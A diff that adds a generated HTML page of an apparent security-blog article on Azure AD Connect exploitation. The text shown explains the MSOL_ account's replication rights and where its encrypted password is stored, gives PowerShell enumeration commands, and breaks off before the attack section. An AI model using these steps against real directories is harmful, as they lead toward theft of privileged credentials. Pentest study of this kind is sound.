@@ -1,0 +1,1787 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    
+    <meta name="generator" content="Hugo 0.135.0">
+
+    <script src="js/custom.js"></script>
+    
+
+    
+
+    
+        
+            <meta
+                name="description"
+                content="Bones &amp; All Cyber Security" />
+        
+
+        
+            <meta
+                name="keywords"
+                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
+        
+
+        
+            <meta name="author" content="bloodstiller" />
+        
+
+    
+
+
+    <title>
+        
+            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation |
+            Hack the planet
+        
+    </title>
+
+    
+
+
+    
+    
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+    
+
+
+    
+    
+
+    
+
+    
+
+        
+            
+            <link
+                rel="stylesheet"
+                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
+                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
+                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/02_style.8484c853cc558c1c2189842f955ad4be9bf66854698f03f140aef3cfc23174c78eb1ab05b915b7877afac7464e5d70d467c87c1fb3fcbe11a75d379de01e0798.css"
+                integrity="sha512-hITIU8xVjBwhiYQvlVrUvpv2aFRpjwPxQK7zz8IxdMeOsasFuRW3h3r6x0ZOXXDUZ8h8H7P8vhGnXTed4B4HmA==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
+                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
+                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
+                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
+                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
+        
+
+    
+
+
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+
+</head>
+
+
+
+    <body>
+        <header class="header">
+    <div class="header_left">
+        
+    </div>
+
+    <div class="header_middle">
+        
+            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation -
+            Hack the planet
+        
+    </div>
+</header>
+
+
+
+        <main>
+            <aside class="sidebar">
+    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li
+                    
+                        class="dir opened-dir"
+                    >
+                    <span class="dir-text"> Articles </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/azureadconnectattack/" title="./articles/azureadconnectattack/">
+                        
+                            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
+                        
+                            Understanding the Shadow Credentials Attack Vector
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
+                        
+                            Understanding .NET Deserialization Exploits: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Walkthroughs </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/monteverde-box/" title="./walkthroughs/monteverde-box/">
+                        
+                            Monteverde HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/outdated-box/" title="./walkthroughs/outdated-box/">
+                        
+                            Outdated HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
+                        
+                            Scrambled HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
+                        
+                            Escape HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
+                        
+                            Hospital HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
+                        
+                            Intelligence HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
+                        
+                            Manager HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
+                        
+                            Access HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
+                        
+                            Remote HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
+                        
+                            Support HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
+                        
+                            Return HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/20230514102147-rpc/" title="./20230514102147-rpc/">
+                        
+                            RPC Cheat Sheet
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
+                        
+                            about me
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+</aside>
+<aside class="exapandable"></aside>
+
+
+            
+    <article class="main">
+        <button
+    class="sidebar-toggle-btn"
+    type="menu"
+    aria-expanded="false"
+    aria-haspopup="true">
+    <i class="bi bi-list"></i>
+</button>
+
+
+
+        <div class="title">
+            <h1 class="title-header">
+                Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/bloodstiller/"
+                                class="cat-btn">
+                                bloodstiller
+                            </a>
+                        </div>
+                    
+
+                
+
+                
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="2024.14.10"
+                            >2024.14.10
+                        </time>
+                    </div>
+                
+
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        10 mins to read
+                    </div>
+                
+            </div>
+        </div>
+
+        <div class="article-meta">
+            
+
+            
+                <div class="tags">
+                    <i
+                        class="bi bi-tags"
+                        title="Tags"></i>
+                    
+                        <a
+                            href="/tags/windows/"
+                            class="tag-btn">
+                            Windows
+                        </a>
+                    
+                        <a
+                            href="/tags/active-directory/"
+                            class="tag-btn">
+                            Active Directory
+                        </a>
+                    
+                        <a
+                            href="/tags/azure-ad-connect/"
+                            class="tag-btn">
+                            Azure AD Connect
+                        </a>
+                    
+                        <a
+                            href="/tags/azure/"
+                            class="tag-btn">
+                            Azure
+                        </a>
+                    
+                        <a
+                            href="/tags/sql/"
+                            class="tag-btn">
+                            SQL
+                        </a>
+                    
+                        <a
+                            href="/tags/mssql/"
+                            class="tag-btn">
+                            MSSQL
+                        </a>
+                    
+                </div>
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+    
+
+
+
+
+<a href="http://localhost:1313/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/articles/" class="bread-btn">
+    
+
+    
+        Articles
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/articles/azureadconnectattack/" class="bread-btn">
+    
+
+    
+        
+            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
+        
+
+    
+</a>
+
+                </div>
+            
+
+            
+        </div>
+
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#used-for-connecting-on-premises-ad-instances-with-azure-cloud-instances">Used-For: Connecting on-premises AD instances with Azure cloud instances</a></li>
+    <li><a href="#overview">Overview:</a>
+      <ul>
+        <li><a href="#pass-through-authentication--pta">Pass-through Authentication (PTA):</a></li>
+        <li><a href="#federated-authentication--adfs">Federated Authentication (ADFS):</a></li>
+        <li><a href="#password-hash-synchronization--phs">Password Hash Synchronization (PHS):</a></li>
+        <li><a href="#password-hash-synchronization--phs--method">Password Hash Synchronization (PHS) Method:</a></li>
+        <li><a href="#installation-configurations">Installation Configurations:</a></li>
+        <li><a href="#the-vulnerability-context">The Vulnerability Context</a></li>
+        <li><a href="#technical-deep-dive">Technical Deep Dive</a></li>
+      </ul>
+    </li>
+    <li><a href="#enumerating-azure-ad-connect">Enumerating Azure AD Connect:</a>
+      <ul>
+        <li><a href="#1-dot-confirm-azure-ad-connect-installation">1. Confirm Azure AD Connect Installation:</a></li>
+        <li><a href="#2-dot-identify-azure-ad-connect-accounts">2. Identify Azure AD Connect Accounts:</a></li>
+        <li><a href="#3-dot-determine-database-configuration">3. Determine Database Configuration:</a></li>
+        <li><a href="#4-dot-localdb-enumeration--if-applicable">4. <code>LocalDB</code> Enumeration (if applicable):</a></li>
+        <li><a href="#5-dot-sql-server-enumeration--for-custom-installations">5. SQL Server Enumeration (for custom installations):</a></li>
+        <li><a href="#6-dot-determine-synchronization-method--gui-only">6. Determine Synchronization Method (GUI only):</a></li>
+        <li><a href="#7-dot-check-for-required-permissions">7. Check for Required Permissions</a></li>
+        <li><a href="#8-dot-check-if-we-can-interact-with-the-database--sql-custom-installation">8. Check if we can interact with the database (SQL Custom installation):</a></li>
+      </ul>
+    </li>
+    <li><a href="#88955c">+Attacking Azure AD Connect+</a>
+      <ul>
+        <li><a href="#exploitating-azure-ad-connect-using-powershell">Exploitating Azure AD Connect Using PowerShell:</a></li>
+        <li><a href="#exploiting-ad-connect-using-adconnectdump--20241014084307-adconnectdump-dot-md">Exploiting AD Connect Using <a href="https://github.com/dirkjanm/adconnectdump?tab=readme-ov-file">adconnectdump</a>:</a></li>
+      </ul>
+    </li>
+    <li><a href="#example-of-this-attack">Example of this attack:</a></li>
+    <li><a href="#mitigation-strategies">Mitigation Strategies</a></li>
+    <li><a href="#detection">Detection</a></li>
+  </ul>
+</nav>
+        
+
+
+        <div class="content">
+            
+                <h2 id="used-for-connecting-on-premises-ad-instances-with-azure-cloud-instances">Used-For: Connecting on-premises AD instances with Azure cloud instances</h2>
+<h2 id="overview">Overview:</h2>
+<p>Azure AD Connect is a Microsoft tool designed to bridge on-premises Active Directory (AD) with Azure AD in the cloud. It offers several synchronization methods:</p>
+<h3 id="pass-through-authentication--pta">Pass-through Authentication (PTA):</h3>
+<ul>
+<li>Validates users&rsquo; passwords directly against on-premises AD</li>
+<li>Enables enforcement of on-premises security and password policies</li>
+</ul>
+<h3 id="federated-authentication--adfs">Federated Authentication (ADFS):</h3>
+<ul>
+<li>Uses a separate federated authentication system like AD FS</li>
+<li>Provides advanced capabilities like multi-factor authentication and third-party MFA integration</li>
+</ul>
+<h3 id="password-hash-synchronization--phs">Password Hash Synchronization (PHS):</h3>
+<ul>
+<li>Synchronizes a hash of the hash of users&rsquo; passwords from on-premises AD to Azure AD</li>
+<li>Allows for cloud-based authentication without on-premises infrastructure dependency</li>
+</ul>
+<h3 id="password-hash-synchronization--phs--method">Password Hash Synchronization (PHS) Method:</h3>
+<p>Here&rsquo;s a simplified diagram illustrating the Password Hash Synchronization (PHS) method:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="&#43;----------------------&#43;%0a%7c%20%20%20On-Premises%20AD%20%20%20%20%20%7c%0a&#43;----------------------&#43;%0a%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%20%20%20%20%7c%20%22User%20accounts%20&amp;%20attributes%22%0a%20%20%20%20%20%20%20%20v%0a&#43;----------------------&#43;%0a%7c%20%20%20Azure%20AD%20Connect%20%20%20%7c%0a%7c%20&#43;------------------&#43;%20%7c%0a%7c%20%7c%20Azure%20AD%20Sync%20%20%20%20%7c%20%7c%0a%7c%20%7c%20%20%20%20Service%20%20%20%20%20%20%20%7c%20%7c%0a%7c%20&#43;------------------&#43;%20%7c%0a%7c%20&#43;------------------&#43;%20%7c%0a%7c%20%7c%20Password%20Hash%20%20%20%20%7c%20%7c%0a%7c%20%7c%20Sync%20Agent%20%20%20%20%20%20%20%7c%20%7c%0a%7c%20&#43;------------------&#43;%20%7c%0a&#43;----------------------&#43;%0a%20%20%20%20%7c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7c%0a%20%20%20%20%7c%20%22Synchronized%20%7c%20%22Synchronized%0a%20%20%20%20%7c%20%20user%20accounts%7c%20password%20hashes%22%0a%20%20%20%20%7c%20%20&amp;%20attributes%22%7c%0a%20%20%20%20v%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20v%0a&#43;----------------------&#43;%0a%7c%20%20%20%20%20%20Azure%20AD%20%20%20%20%20%20%20%20%7c%0a&#43;----------------------&#43;">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <pre><code>&#43;----------------------&#43;
+|   On-Premises AD     |
+&#43;----------------------&#43;
+        |
+        | &#34;User accounts &amp; attributes&#34;
+        v
+&#43;----------------------&#43;
+|   Azure AD Connect   |
+| &#43;------------------&#43; |
+| | Azure AD Sync    | |
+| |    Service       | |
+| &#43;------------------&#43; |
+| &#43;------------------&#43; |
+| | Password Hash    | |
+| | Sync Agent       | |
+| &#43;------------------&#43; |
+&#43;----------------------&#43;
+    |               |
+    | &#34;Synchronized | &#34;Synchronized
+    |  user accounts| password hashes&#34;
+    |  &amp; attributes&#34;|
+    v               v
+&#43;----------------------&#43;
+|      Azure AD        |
+&#43;----------------------&#43;</code></pre>
+    
+</div>
+<ul>
+<li>+Note+: Password hashes are further hashed before being sent to Azure AD for additional security.</li>
+</ul>
+<p>This diagram illustrates the flow of data in the PHS method:</p>
+<ol>
+<li>User accounts and attributes are sent from the on-premises AD to the Azure AD Sync Service within Azure AD Connect.</li>
+<li>Password hashes are separately processed by the Password Hash Sync Agent.</li>
+<li>Synchronized user accounts and attributes are sent to Azure AD.</li>
+<li>Synchronized (and further hashed) password hashes are sent to Azure AD.</li>
+</ol>
+<p>The separation of user data and password hash synchronization processes within Azure AD Connect is a key security feature, but it&rsquo;s also what allows for potential exploitation if an attacker gains access to the Azure AD Connect server.</p>
+<h3 id="installation-configurations">Installation Configurations:</h3>
+<p>A default installation of Azure AD Connect uses a SQL Server Express instance as a <code>LocalDB</code>, connecting over a named pipe. This configuration is common and straightforward to set up.</p>
+<p>However, it&rsquo;s important to note that custom installations are possible. In some cases, Azure AD Connect might be configured to use a full Microsoft SQL Server installation. This SQL Server could be bound to a port internally but not accessible externally. Such custom setups can occur when organizations have specific requirements or are integrating Azure AD Connect with existing database infrastructure.</p>
+<p>Understanding the installation configuration is crucial for both security assessments and potential exploitation attempts. It affects how the system can be enumerated, what vulnerabilities might be present, and how any potential attacks could be carried out.</p>
+<h3 id="the-vulnerability-context">The Vulnerability Context</h3>
+<p>The exploit we&rsquo;ll be discussing doesn&rsquo;t rely on a software bug, but rather on the architectural design of Azure AD Connect and potential misconfigurations in its deployment. This is particularly relevant to installations using Password Hash Synchronization (PHS).</p>
+<h3 id="technical-deep-dive">Technical Deep Dive</h3>
+<h4 id="1-dot-the-msol-account">1. The MSOL Account</h4>
+<p>During installation, Azure AD Connect creates a service account named MSOL_[HEX]. This account is granted extensive permissions, including:</p>
+<ul>
+<li>Replicating Directory Changes</li>
+<li>Replicating Directory Changes All</li>
+<li>Replicating Directory Changes In Filtered Set</li>
+</ul>
+<p>These permissions allow the account to perform Directory Replication Service (DRS) operations, including +DCSync+.</p>
+<h4 id="2-dot-password-hash-synchronization--phs--mechanism">2. Password Hash Synchronization (PHS) Mechanism</h4>
+<p>PHS uses the <code>Microsoft.Online.PasswordSynchronization.dll</code> assembly to handle hash synchronization. This DLL leverages the same DRS APIs used by tools like <code>Mimikatz</code> for +DCSync+ operations.</p>
+<h4 id="3-dot-local-database-storage">3. Local Database Storage</h4>
+<p>Azure AD Connect stores its configuration in a SQL Server <code>LocalDB</code> instance by default. Key information includes:</p>
+<ul>
+<li>Database: <code>ADSync</code></li>
+<li>Table: <code>mms_management_agent</code></li>
+<li>Fields of interest:
+<ul>
+<li><code>private_configuration_xml</code></li>
+<li><code>encrypted_configuration</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="4-dot-encryption-mechanism">4. Encryption Mechanism</h4>
+<p>The MSOL account password is encrypted and stored in the <code>encrypted_configuration</code> field. Decryption is handled by <code>mcrypt.dll</code>, located in the Azure AD Connect installation directory.</p>
+<ul>
+<li><code>C:\Program Files\Microsoft Azure AD Sync\Binn\mcrypt.dll</code></li>
+</ul>
+<h2 id="enumerating-azure-ad-connect">Enumerating Azure AD Connect:</h2>
+<p>Before attempting to exploit Azure AD Connect, it&rsquo;s important to confirm its presence and understand its configuration. Here&rsquo;s a structured approach to enumeration:</p>
+<h3 id="1-dot-confirm-azure-ad-connect-installation">1. Confirm Azure AD Connect Installation:</h3>
+<ul>
+<li>
+<p><strong>Check for the Azure AD Connect installation directory</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>  Test-Path <span style="color:#e6db74">&#34;C:\Program Files\Microsoft Azure AD Sync&#34;</span></span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>Check for Azure AD Connect service in the registry</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>  Get-Item -Path HKLM<span style="color:#960050;background-color:#1e0010">:</span>\SYSTEM\CurrentControlSet\Services\ADSync</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>Check for the Azure AD Connect synchronization service</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20Get-Service%20ADSync">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>  Get-Service ADSync</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+<h3 id="2-dot-identify-azure-ad-connect-accounts">2. Identify Azure AD Connect Accounts:</h3>
+<ul>
+<li><strong>Search for</strong> <code>MSOL_</code> <strong>or</strong> <code>AAD_</code> <strong>accounts in Active Directory</strong>:
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20Get-ADUser%20-Filter%20%22samaccountname%20-like%20%27MSOL_*%27%20-or%20samaccountname%20-like%20%27AAD_*%27%22%20-Properties%20*">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>  Get-ADUser -Filter <span style="color:#e6db74">&#34;samaccountname -like &#39;MSOL_*&#39; -or samaccountname -like &#39;AAD_*&#39;&#34;</span> -Properties *</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+<h3 id="3-dot-determine-database-configuration">3. Determine Database Configuration:</h3>
+<ul>
+<li>
+<p><strong>Check for</strong> <code>LocalDB</code> <strong>(default configuration)</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20SqlLocalDB.exe%20info%20ADSync">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>  SqlLocalDB.exe info ADSync</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>If</strong> <code>LocalDB</code> <strong>is not found, check for full SQL Server installation</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>  Get-ChildItem <span style="color:#e6db74">&#34;C:\Program Files\Microsoft SQL Server&#34;</span> -ErrorAction SilentlyContinue</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>If this is found jump to step 5</li>
+</ul>
+</li>
+</ul>
+<h3 id="4-dot-localdb-enumeration--if-applicable">4. <code>LocalDB</code> Enumeration (if applicable):</h3>
+<ul>
+<li>
+<p><strong>List</strong> <code>LocalDB</code> <strong>instances</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20SqlLocalDB.exe%20info">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>  SqlLocalDB.exe info</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>Start the ADSync instance if it&rsquo;s not running</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20SqlLocalDB.exe%20start%20ADSync">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>  SqlLocalDB.exe start ADSync</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>Get the pipe name for the ADSync instance</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20SqlLocalDB.exe%20info%20ADSync%20%7c%20findstr%20%22Instance%20pipe%20name%22">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>  SqlLocalDB.exe info ADSync | findstr <span style="color:#e6db74">&#34;Instance pipe name&#34;</span></span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+<h3 id="5-dot-sql-server-enumeration--for-custom-installations">5. SQL Server Enumeration (for custom installations):</h3>
+<ul>
+<li>
+<p><strong>Check for SQL Server network configuration</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>  netstat -ano | findstr <span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">1433</span></span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>Enumerate SQL Server instances</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>  Get-ItemProperty <span style="color:#e6db74">&#34;HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL&#34;</span></span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>Check for custom database configuration in Azure AD Connect files</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>  Get-Content <span style="color:#e6db74">&#34;C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf&#34;</span></span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+<h3 id="6-dot-determine-synchronization-method--gui-only">6. Determine Synchronization Method (GUI only):</h3>
+<ul>
+<li>
+<p><strong>Open the Synchronization Service Manager</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <pre><code>  C:\Program Files\Microsoft Azure AD Sync\UIShell\miisclient.exe</code></pre>
+    
+</div>
+</li>
+<li>
+<p>In the &ldquo;<code>Connectors</code>&rdquo; tab, look for a connector of type &ldquo;Windows Azure Active Directory (Microsoft)&rdquo;.</p>
+</li>
+<li>
+<p>Check if the &ldquo;Password Synchronization&rdquo; column shows &ldquo;Enabled&rdquo; for Password Hash Synchronization.</p>
+</li>
+</ul>
+<h3 id="7-dot-check-for-required-permissions">7. Check for Required Permissions</h3>
+<ul>
+<li>
+<p><strong>Verify current user&rsquo;s group membership</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
